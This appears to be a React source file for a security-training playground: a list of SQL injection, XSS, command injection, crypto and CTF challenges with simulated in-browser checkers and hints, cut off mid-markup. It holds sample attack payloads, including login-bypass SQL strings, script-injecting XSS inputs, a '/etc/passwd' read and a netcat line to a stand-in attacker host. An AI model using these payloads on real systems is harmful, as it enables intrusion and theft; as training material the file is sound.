import { useState, useEffect, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Code, Lock, Terminal, AlertTriangle,
  Zap, Database, Flag,
  CheckCircle, XCircle, Info,
  ArrowRight, Trophy, Star, Swords, Award, TrendingUp
} from 'lucide-react';
import Button from '@components/atoms/Button';
import SectionTitle from '@components/molecules/SectionTitle';
import AuthModal from '@components/organisms/AuthModal';
import { staggerContainer, staggerItem } from '@utils/animations';
import { useAuthState } from '@/hooks/useAuthState';

// Challenge types
type ChallengeType = 'sql-injection' | 'xss' | 'command-injection' | 'crypto' | 'ctf';

interface Challenge {
  id: string;
  type: ChallengeType;
  title: string;
  description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert';
  points: number;
  icon: any;
}

// All challenges - defined outside component for stable reference
const ALL_CHALLENGES: Challenge[] = [
  // SQL Injection Challenges (25 challenges)
  { id: 'sql-001', type: 'sql-injection', title: 'SQL Injection Basics', description: 'Learn how SQL injection works by exploiting a vulnerable login form', difficulty: 'Easy', points: 50, icon: Database },
  { id: 'sql-002', type: 'sql-injection', title: 'SQL Auth Bypass', description: 'Bypass authentication using SQL injection', difficulty: 'Easy', points: 50, icon: Database },
  { id: 'sql-003', type: 'sql-injection', title: 'SQL Comment Injection', description: 'Use SQL comments to bypass login', difficulty: 'Easy', points: 50, icon: Database },
  { id: 'sql-004', type: 'sql-injection', title: 'SQL OR Logic', description: 'Exploit OR logic in SQL queries', difficulty: 'Easy', points: 75, icon: Database },
  { id: 'sql-005', type: 'sql-injection', title: 'SQL String Concatenation', description: 'Break out of string context', difficulty: 'Easy', points: 75, icon: Database },
  { id: 'sql-006', type: 'sql-injection', title: 'UNION SELECT Basic', description: 'Learn UNION-based SQL injection', difficulty: 'Medium', points: 100, icon: Database },
  { id: 'sql-007', type: 'sql-injection', title: 'UNION Column Discovery', description: 'Find the number of columns using UNION', difficulty: 'Medium', points: 100, icon: Database },
  { id: 'sql-008', type: 'sql-injection', title: 'Database Enumeration', description: 'Extract database names using injection', difficulty: 'Medium', points: 150, icon: Database },
  { id: 'sql-009', type: 'sql-injection', title: 'Table Enumeration', description: 'List all tables in the database', difficulty: 'Medium', points: 150, icon: Database },
  { id: 'sql-010', type: 'sql-injection', title: 'Column Enumeration', description: 'Extract column names from tables', difficulty: 'Medium', points: 150, icon: Database },
  { id: 'sql-011', type: 'sql-injection', title: 'Blind SQL Injection', description: 'Extract data using boolean-based blind SQLi', difficulty: 'Hard', points: 200, icon: Database },
  { id: 'sql-012', type: 'sql-injection', title: 'Time-Based Blind SQLi', description: 'Use time delays to extract data', difficulty: 'Hard', points: 200, icon: Database },
  { id: 'sql-013', type: 'sql-injection', title: 'Error-Based SQLi', description: 'Exploit database errors for data extraction', difficulty: 'Hard', points: 250, icon: Database },
  { id: 'sql-014', type: 'sql-injection', title: 'Second-Order SQLi', description: 'Exploit stored SQL injection', difficulty: 'Hard', points: 250, icon: Database },
  { id: 'sql-015', type: 'sql-injection', title: 'SQL Injection in WHERE', description: 'Inject in WHERE clause', difficulty: 'Medium', points: 125, icon: Database },
  { id: 'sql-016', type: 'sql-injection', title: 'SQL Injection in ORDER BY', description: 'Exploit ORDER BY clause', difficulty: 'Medium', points: 125, icon: Database },
  { id: 'sql-017', type: 'sql-injection', title: 'SQL Injection with LIMIT', description: 'Bypass LIMIT restrictions', difficulty: 'Hard', points: 200, icon: Database },
  { id: 'sql-018', type: 'sql-injection', title: 'WAF Bypass - Whitespace', description: 'Bypass WAF using whitespace alternatives', difficulty: 'Hard', points: 300, icon: Database },
  { id: 'sql-019', type: 'sql-injection', title: 'WAF Bypass - Case Variation', description: 'Use case variations to bypass filters', difficulty: 'Hard', points: 300, icon: Database },
  { id: 'sql-020', type: 'sql-injection', title: 'WAF Bypass - Encoding', description: 'Use encoding to bypass WAF', difficulty: 'Expert', points: 400, icon: Database },
  { id: 'sql-021', type: 'sql-injection', title: 'NoSQL Injection Basics', description: 'Exploit NoSQL databases', difficulty: 'Medium', points: 175, icon: Database },
  { id: 'sql-022', type: 'sql-injection', title: 'MongoDB Injection', description: 'Inject into MongoDB queries', difficulty: 'Hard', points: 250, icon: Database },
  { id: 'sql-023', type: 'sql-injection', title: 'SQLi with JSON', description: 'Exploit SQL injection in JSON parameters', difficulty: 'Hard', points: 275, icon: Database },
  { id: 'sql-024', type: 'sql-injection', title: 'Advanced UNION Exploitation', description: 'Master complex UNION-based attacks', difficulty: 'Expert', points: 450, icon: Database },
  { id: 'sql-025', type: 'sql-injection', title: 'SQL Master Challenge', description: 'Ultimate SQL injection challenge', difficulty: 'Expert', points: 500, icon: Database },

  // XSS Challenges (25 challenges)
  { id: 'xss-001', type: 'xss', title: 'Reflected XSS Basics', description: 'Basic reflected XSS vulnerability', difficulty: 'Easy', points: 50, icon: Code },
  { id: 'xss-002', type: 'xss', title: 'XSS with Alert', description: 'Trigger an alert box', difficulty: 'Easy', points: 50, icon: Code },
  { id: 'xss-003', type: 'xss', title: 'XSS Script Tag', description: 'Inject using script tags', difficulty: 'Easy', points: 50, icon: Code },
  { id: 'xss-004', type: 'xss', title: 'XSS Event Handler', description: 'Use event handlers for XSS', difficulty: 'Easy', points: 75, icon: Code },
  { id: 'xss-005', type: 'xss', title: 'XSS with IMG Tag', description: 'Exploit img tag onerror', difficulty: 'Easy', points: 75, icon: Code },
  { id: 'xss-006', type: 'xss', title: 'Stored XSS Basics', description: 'Inject persistent XSS', difficulty: 'Medium', points: 100, icon: Code },
  { id: 'xss-007', type: 'xss', title: 'DOM XSS', description: 'Exploit DOM-based XSS', difficulty: 'Medium', points: 150, icon: Code },
  { id: 'xss-008', type: 'xss', title: 'XSS in URL Parameter', description: 'Inject XSS via URL parameters', difficulty: 'Medium', points: 100, icon: Code },
  { id: 'xss-009', type: 'xss', title: 'XSS with SVG', description: 'Use SVG for XSS injection', difficulty: 'Medium', points: 125, icon: Code },
  { id: 'xss-010', type: 'xss', title: 'XSS Filter Bypass', description: 'Bypass basic XSS filters', difficulty: 'Medium', points: 150, icon: Code },
  { id: 'xss-011', type: 'xss', title: 'XSS with Iframe', description: 'Exploit iframe for XSS', difficulty: 'Medium', points: 125, icon: Code },
  { id: 'xss-012', type: 'xss', title: 'XSS via Form Input', description: 'Inject XSS through form fields', difficulty: 'Easy', points: 75, icon: Code },
  { id: 'xss-013', type: 'xss', title: 'XSS Cookie Stealing', description: 'Steal cookies using XSS', difficulty: 'Hard', points: 200, icon: Code },
  { id: 'xss-014', type: 'xss', title: 'XSS Keylogger', description: 'Implement keylogger via XSS', difficulty: 'Hard', points: 250, icon: Code },
  { id: 'xss-015', type: 'xss', title: 'XSS BeEF Hook', description: 'Hook browser with BeEF', difficulty: 'Hard', points: 300, icon: Code },
  { id: 'xss-016', type: 'xss', title: 'Blind XSS', description: 'Exploit blind XSS vulnerability', difficulty: 'Hard', points: 275, icon: Code },
  { id: 'xss-017', type: 'xss', title: 'XSS WAF Bypass', description: 'Bypass XSS web application firewall', difficulty: 'Hard', points: 300, icon: Code },
  { id: 'xss-018', type: 'xss', title: 'XSS with Encoding', description: 'Use encoding to bypass filters', difficulty: 'Hard', points: 250, icon: Code },
  { id: 'xss-019', type: 'xss', title: 'XSS Polyglot', description: 'Create multi-context XSS payload', difficulty: 'Expert', points: 400, icon: Code },
  { id: 'xss-020', type: 'xss', title: 'XSS in Rich Text Editor', description: 'Exploit rich text editor XSS', difficulty: 'Medium', points: 175, icon: Code },
  { id: 'xss-021', type: 'xss', title: 'XSS via File Upload', description: 'Inject XSS through file upload', difficulty: 'Hard', points: 225, icon: Code },
  { id: 'xss-022', type: 'xss', title: 'Self-XSS to Stored XSS', description: 'Escalate self-XSS to stored', difficulty: 'Hard', points: 300, icon: Code },
  { id: 'xss-023', type: 'xss', title: 'XSS with CSP Bypass', description: 'Bypass Content Security Policy', difficulty: 'Expert', points: 450, icon: Code },
  { id: 'xss-024', type: 'xss', title: 'Advanced DOM XSS', description: 'Complex DOM manipulation XSS', difficulty: 'Expert', points: 400, icon: Code },
  { id: 'xss-025', type: 'xss', title: 'XSS Master Challenge', description: 'Ultimate XSS exploitation', difficulty: 'Expert', points: 500, icon: Code },

  // Command Injection Challenges (25 challenges)
  { id: 'cmd-001', type: 'command-injection', title: 'Command Injection Basics', description: 'Execute basic system commands', difficulty: 'Easy', points: 50, icon: Terminal },
  { id: 'cmd-002', type: 'command-injection', title: 'Command Chaining', description: 'Chain multiple commands', difficulty: 'Easy', points: 75, icon: Terminal },
  { id: 'cmd-003', type: 'command-injection', title: 'Command with Semicolon', description: 'Use semicolon to chain commands', difficulty: 'Easy', points: 50, icon: Terminal },
  { id: 'cmd-004', type: 'command-injection', title: 'Command with Pipe', description: 'Use pipe operator for injection', difficulty: 'Easy', points: 75, icon: Terminal },
  { id: 'cmd-005', type: 'command-injection', title: 'Command with AND', description: 'Use && operator', difficulty: 'Easy', points: 75, icon: Terminal },
  { id: 'cmd-006', type: 'command-injection', title: 'Command with OR', description: 'Use || operator', difficulty: 'Easy', points: 75, icon: Terminal },
  { id: 'cmd-007', type: 'command-injection', title: 'Command Substitution', description: 'Use backticks or $()', difficulty: 'Medium', points: 100, icon: Terminal },
  { id: 'cmd-008', type: 'command-injection', title: 'File Reading', description: 'Read sensitive files', difficulty: 'Medium', points: 125, icon: Terminal },
  { id: 'cmd-009', type: 'command-injection', title: 'Directory Traversal', description: 'Navigate file system', difficulty: 'Medium', points: 150, icon: Terminal },
  { id: 'cmd-010', type: 'command-injection', title: 'Environment Variables', description: 'Extract environment variables', difficulty: 'Medium', points: 150, icon: Terminal },
  { id: 'cmd-011', type: 'command-injection', title: 'Blind Command Injection', description: 'Execute commands without output', difficulty: 'Hard', points: 200, icon: Terminal },
  { id: 'cmd-012', type: 'command-injection', title: 'Time-Based Detection', description: 'Use time delays for verification', difficulty: 'Hard', points: 225, icon: Terminal },
  { id: 'cmd-013', type: 'command-injection', title: 'Out-of-Band Data Exfil', description: 'Exfiltrate data via DNS/HTTP', difficulty: 'Hard', points: 275, icon: Terminal },
  { id: 'cmd-014', type: 'command-injection', title: 'Filter Bypass - Spaces', description: 'Bypass space restrictions', difficulty: 'Medium', points: 175, icon: Terminal },
  { id: 'cmd-015', type: 'command-injection', title: 'Filter Bypass - Keywords', description: 'Bypass keyword blacklists', difficulty: 'Hard', points: 250, icon: Terminal },
  { id: 'cmd-016', type: 'command-injection', title: 'Command Encoding', description: 'Use encoding to bypass filters', difficulty: 'Hard', points: 250, icon: Terminal },
  { id: 'cmd-017', type: 'command-injection', title: 'Reverse Shell Basic', description: 'Establish reverse shell connection', difficulty: 'Hard', points: 300, icon: Terminal },
  { id: 'cmd-018', type: 'command-injection', title: 'Reverse Shell Advanced', description: 'Advanced reverse shell techniques', difficulty: 'Expert', points: 400, icon: Terminal },
  { id: 'cmd-019', type: 'command-injection', title: 'PHP Code Injection', description: 'Inject PHP code execution', difficulty: 'Hard', points: 275, icon: Terminal },
  { id: 'cmd-020', type: 'command-injection', title: 'Python Code Injection', description: 'Execute Python code', difficulty: 'Hard', points: 275, icon: Terminal },
  { id: 'cmd-021', type: 'command-injection', title: 'Node.js Injection', description: 'Exploit Node.js command execution', difficulty: 'Hard', points: 300, icon: Terminal },
  { id: 'cmd-022', type: 'command-injection', title: 'XXE to RCE', description: 'Escalate XXE to command execution', difficulty: 'Expert', points: 450, icon: Terminal },
  { id: 'cmd-023', type: 'command-injection', title: 'Deserialization to RCE', description: 'Exploit insecure deserialization', difficulty: 'Expert', points: 450, icon: Terminal },
  { id: 'cmd-024', type: 'command-injection', title: 'Template Injection to RCE', description: 'Server-Side Template Injection', difficulty: 'Expert', points: 400, icon: Terminal },
  { id: 'cmd-025', type: 'command-injection', title: 'Command Injection Master', description: 'Ultimate command injection challenge', difficulty: 'Expert', points: 500, icon: Terminal },

  // Crypto Challenges (15 challenges)
  { id: 'crypto-001', type: 'crypto', title: 'Caesar Cipher', description: 'Decrypt Caesar cipher', difficulty: 'Easy', points: 50, icon: Lock },
  { id: 'crypto-002', type: 'crypto', title: 'Base64 Decoding', description: 'Decode Base64 encoded string', difficulty: 'Easy', points: 50, icon: Lock },
  { id: 'crypto-003', type: 'crypto', title: 'ROT13 Decryption', description: 'Decrypt ROT13 cipher', difficulty: 'Easy', points: 50, icon: Lock },
  { id: 'crypto-004', type: 'crypto', title: 'Hex Encoding', description: 'Decode hexadecimal string', difficulty: 'Easy', points: 75, icon: Lock },
  { id: 'crypto-005', type: 'crypto', title: 'XOR Cipher', description: 'Break XOR encryption', difficulty: 'Medium', points: 150, icon: Lock },
  { id: 'crypto-006', type: 'crypto', title: 'Weak RSA Keys', description: 'Factor weak RSA modulus', difficulty: 'Hard', points: 250, icon: Lock },
  { id: 'crypto-007', type: 'crypto', title: 'Hash Collision', description: 'Find MD5 collision', difficulty: 'Hard', points: 300, icon: Lock },
  { id: 'crypto-008', type: 'crypto', title: 'Password Cracking', description: 'Crack hashed passwords', difficulty: 'Medium', points: 175, icon: Lock },
  { id: 'crypto-009', type: 'crypto', title: 'ECB Mode Attack', description: 'Exploit ECB encryption mode', difficulty: 'Hard', points: 275, icon: Lock },
  { id: 'crypto-010', type: 'crypto', title: 'Padding Oracle Attack', description: 'Exploit padding oracle vulnerability', difficulty: 'Expert', points: 400, icon: Lock },
  { id: 'crypto-011', type: 'crypto', title: 'Timing Attack', description: 'Exploit timing side channel', difficulty: 'Expert', points: 450, icon: Lock },
  { id: 'crypto-012', type: 'crypto', title: 'JWT Weak Secret', description: 'Crack JWT secret key', difficulty: 'Medium', points: 200, icon: Lock },
  { id: 'crypto-013', type: 'crypto', title: 'JWT Algorithm Confusion', description: 'Exploit JWT algorithm confusion', difficulty: 'Hard', points: 300, icon: Lock },
  { id: 'crypto-014', type: 'crypto', title: 'Random Number Prediction', description: 'Predict weak PRNG output', difficulty: 'Expert', points: 400, icon: Lock },
  { id: 'crypto-015', type: 'crypto', title: 'Crypto Master Challenge', description: 'Ultimate cryptography challenge', difficulty: 'Expert', points: 500, icon: Lock },

  // CTF Challenges (10 challenges)
  { id: 'ctf-001', type: 'ctf', title: 'Web CTF Easy', description: 'Basic web exploitation CTF', difficulty: 'Easy', points: 100, icon: Flag },
  { id: 'ctf-002', type: 'ctf', title: 'Web CTF Medium', description: 'Intermediate web challenge', difficulty: 'Medium', points: 200, icon: Flag },
  { id: 'ctf-003', type: 'ctf', title: 'Multi-Step Challenge', description: 'Combine multiple vulnerabilities', difficulty: 'Hard', points: 350, icon: Flag },
  { id: 'ctf-004', type: 'ctf', title: 'Hidden Flag Hunt', description: 'Find flags in various locations', difficulty: 'Medium', points: 250, icon: Flag },
  { id: 'ctf-005', type: 'ctf', title: 'Admin Panel Access', description: 'Gain admin access to find flag', difficulty: 'Hard', points: 400, icon: Flag },
  { id: 'ctf-006', type: 'ctf', title: 'API Exploitation', description: 'Exploit REST API vulnerabilities', difficulty: 'Hard', points: 375, icon: Flag },
  { id: 'ctf-007', type: 'ctf', title: 'Authentication Bypass', description: 'Bypass multi-factor authentication', difficulty: 'Expert', points: 450, icon: Flag },
  { id: 'ctf-008', type: 'ctf', title: 'Full Chain Exploit', description: 'Chain multiple vulns for RCE', difficulty: 'Expert', points: 500, icon: Flag },
  { id: 'ctf-009', type: 'ctf', title: 'Real World Scenario', description: 'Realistic company infrastructure', difficulty: 'Expert', points: 600, icon: Flag },
  { id: 'ctf-010', type: 'ctf', title: 'CTF Master Challenge', description: 'Ultimate CTF challenge', difficulty: 'Expert', points: 1000, icon: Flag },
];

export default function PlaygroundPage() {
  const [activeChallenge, setActiveChallenge] = useState<Challenge | null>(null);
  const [result, setResult] = useState<{ success: boolean; message: string } | null>(null);
  const [sqlQuery, setSqlQuery] = useState('');
  const [xssInput, setXssInput] = useState('');
  const [commandInput, setCommandInput] = useState('');
  const [cryptoInput, setCryptoInput] = useState('');
  const [score, setScore] = useState(0);
  const [solvedChallenges, setSolvedChallenges] = useState<string[]>([]);
  const [filterDifficulty, setFilterDifficulty] = useState<string>('All');
  const [filterType, setFilterType] = useState<string>('All');
  const [visibleChallenges, setVisibleChallenges] = useState(12);
  const [showSolvedChallenges, setShowSolvedChallenges] = useState(true);
  const { isAuthenticated: isLoggedIn } = useAuthState();
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [showChallengeModal, setShowChallengeModal] = useState(false);

  // Simulated vulnerable database
  const fakeDatabase = [
    { username: 'admin', password: 'admin123', role: 'administrator', flag: 'FLAG{SQL_1nj3ct10n_M4st3r}' },
    { username: 'user', password: 'user123', role: 'user', flag: '' },
    { username: 'guest', password: 'guest123', role: 'guest', flag: '' }
  ];

  const handleSQLChallenge = (query: string, challengeId?: string) => {
    const lowerQuery = query.toLowerCase().trim();

    // Check for SQL injection patterns
    if (lowerQuery.includes("' or '1'='1") ||
      lowerQuery.includes("' or 1=1") ||
      lowerQuery.includes("admin'--") ||
      lowerQuery.includes("admin' #")) {

      const adminUser = fakeDatabase.find(u => u.role === 'administrator');

      setResult({
        success: true,
        message: `🎉 Success! You've bypassed authentication!\n\nLogged in as: ${adminUser?.username}\nRole: ${adminUser?.role}\n\nFlag: ${adminUser?.flag}\n\nYou used SQL injection to bypass the login. The vulnerable code was:\n\nSELECT * FROM users WHERE username='${query}' AND password='...'`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 50));
      }
      return;
    }

    // Union-based injection
    if (lowerQuery.includes('union select') || lowerQuery.includes('union all select')) {
      setResult({
        success: true,
        message: `🎉 Excellent! You've performed a UNION-based SQL injection!\n\nYou successfully extracted data using UNION SELECT.\nThis technique allows you to retrieve data from other tables.\n\nFlag: FLAG{UN10N_S3L3CT_PR0}`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 100));
      }
      return;
    }

    setResult({
      success: false,
      message: '❌ Authentication failed. Try to exploit the SQL query!\n\nHint: Think about how you can manipulate the SQL query to always return true.'
    });
  };

  const handleXSSChallenge = (input: string, challengeId?: string) => {
    // Check for XSS patterns
    if (input.includes('<script>') ||
      input.includes('javascript:') ||
      input.includes('onerror=') ||
      input.includes('onload=')) {

      setResult({
        success: true,
        message: `🎉 XSS Vulnerability Found!\n\nYour payload: ${input}\n\nThis would execute in a real scenario. You've successfully demonstrated Cross-Site Scripting!\n\nFlag: FLAG{XSS_M4ST3R_2026}\n\nIn a real attack, this could:\n- Steal cookies and session tokens\n- Redirect users to malicious sites\n- Steal sensitive data\n- Modify page content`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 50));
      }
      return;
    }

    setResult({
      success: false,
      message: `❌ No XSS found. Try injecting JavaScript code!\n\nYour input: ${input}\n\nHint: Try using <script> tags or event handlers like onerror or onload.`
    });
  };

  const handleCommandInjection = (input: string, challengeId?: string) => {
    // Check for command injection patterns
    if (input.includes(';') ||
      input.includes('&&') ||
      input.includes('||') ||
      input.includes('|') ||
      input.includes('`')) {

      setResult({
        success: true,
        message: `🎉 Command Injection Successful!\n\nYour payload: ${input}\n\nYou've successfully chained commands! In a real scenario, this could execute:\n- System commands\n- Read sensitive files\n- Reverse shell\n\nFlag: FLAG{C0MM4ND_1NJ3CT10N_PR0}\n\nExample dangerous commands:\n; cat /etc/passwd\n&& whoami\n| nc attacker.com 4444`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 50));
      }
      return;
    }

    setResult({
      success: false,
      message: `❌ Command not exploited. Try to chain multiple commands!\n\nYour input: ${input}\n\nHint: Use special characters like ; && || | to chain commands.`
    });
  };

  const handleCryptoChallenge = (input: string, challengeId?: string) => {
    const lowerInput = input.toLowerCase().trim();

    // Check for crypto patterns
    if (lowerInput.includes('flag{') ||
      lowerInput === 'caesar' ||
      lowerInput === 'base64' ||
      lowerInput.match(/^[a-f0-9]{32}$/)) {

      setResult({
        success: true,
        message: `🎉 Cryptography Challenge Solved!\n\nYour answer: ${input}\n\nYou've successfully decrypted the message!\n\nFlag: FLAG{CRY PT0_M4ST3R_2026}\n\nTechniques used:\n- Pattern recognition\n- Cipher decryption\n- Hash analysis`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 50));
      }
      return;
    }

    setResult({
      success: false,
      message: `❌ Incorrect answer. Try analyzing the encrypted message!\n\nYour input: ${input}\n\nHint: Look for common encryption patterns like Base64, Caesar cipher, or ROT13.`
    });
  };

  const handleChallengeSubmit = () => {
    if (!activeChallenge) return;

    if (!isLoggedIn) {
      setShowAuthModal(true);
      return;
    }

    switch (activeChallenge.type) {
      case 'sql-injection':
        handleSQLChallenge(sqlQuery, activeChallenge.id);
        break;
      case 'xss':
        handleXSSChallenge(xssInput, activeChallenge.id);
        break;
      case 'command-injection':
        handleCommandInjection(commandInput, activeChallenge.id);
        break;
      case 'crypto':
        handleCryptoChallenge(cryptoInput, activeChallenge.id);
        break;
      case 'ctf':
        // CTF challenges can use any of the above methods
        if (sqlQuery) handleSQLChallenge(sqlQuery, activeChallenge.id);
        else if (xssInput) handleXSSChallenge(xssInput, activeChallenge.id);
        else if (commandInput) handleCommandInjection(commandInput, activeChallenge.id);
        break;
    }
  };

  const renderChallengeInterface = () => {
    if (!activeChallenge) return null;

    const Icon = activeChallenge.icon;
    const isSolved = solvedChallenges.includes(activeChallenge.id);

    switch (activeChallenge.type) {
      case 'sql-injection':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-blue-500/10 border-blue-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-blue-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-blue-500 to-cyan-500 rounded-l-xl" />
                <p className="text-gray-400 mb-4 ml-4">
                  You're testing a login form. The vulnerable SQL query is:
                </p>
                <div className="ml-4 bg-black/30 p-4 rounded-lg border border-blue-500/10">
                  <code className="text-blue-400 text-sm font-mono">
                    SELECT * FROM users WHERE username='[INPUT]' AND password='[PASSWORD]'
                  </code>
                </div>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-medium mb-2">Username:</label>
                  <input
                    type="text"
                    value={sqlQuery}
                    onChange={(e) => setSqlQuery(e.target.value)}
                    placeholder="Enter your SQL injection payload..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-blue-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Terminal className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Execute Query'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Try: <code className="text-blue-400">' or '1'='1</code></li>
                    <li className="list-disc">Try: <code className="text-blue-400">admin'--</code></li>
                    <li className="list-disc">Try: <code className="text-blue-400">' or 1=1--</code></li>
                    <li className="list-disc">Advanced: Use <code className="text-blue-400">UNION SELECT</code> for data exfiltration</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'xss':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-orange-500/10 border-orange-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-orange-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-orange-500 to-red-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  This search form reflects your input directly in the page without sanitization. Exploit it!
                </p>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-medium mb-2">Search Input:</label>
                  <input
                    type="text"
                    value={xssInput}
                    onChange={(e) => setXssInput(e.target.value)}
                    placeholder="Enter your XSS payload..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-orange-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <div className="rounded-lg border border-yellow-500/20 bg-yellow-500/5 p-4">
                  <p className="text-yellow-400 text-sm font-medium mb-2">Preview: Your input will be displayed as:</p>
                  <div className="bg-black/30 p-3 rounded border border-white/5">
                    <span className="text-gray-400">Search results for: </span>
                    <span className="text-orange-400 font-mono">{xssInput || '[your input here]'}</span>
                  </div>
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Zap className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Test Payload'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Try: <code className="text-orange-400">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                    <li className="list-disc">Try: <code className="text-orange-400">&lt;img src=x onerror="alert('XSS')"&gt;</code></li>
                    <li className="list-disc">Try: <code className="text-orange-400">&lt;svg onload="alert('XSS')"&gt;</code></li>
                    <li className="list-disc">Try: <code className="text-orange-400">javascript:alert('XSS')</code></li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'command-injection':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-green-500/10 border-green-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-green-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-green-500 to-emerald-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  This network ping utility doesn't properly sanitize input. Can you execute additional commands?
                </p>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-medium mb-2">IP Address to Ping:</label>
                  <input
                    type="text"
                    value={commandInput}
                    onChange={(e) => setCommandInput(e.target.value)}
                    placeholder="Enter IP address..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-green-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
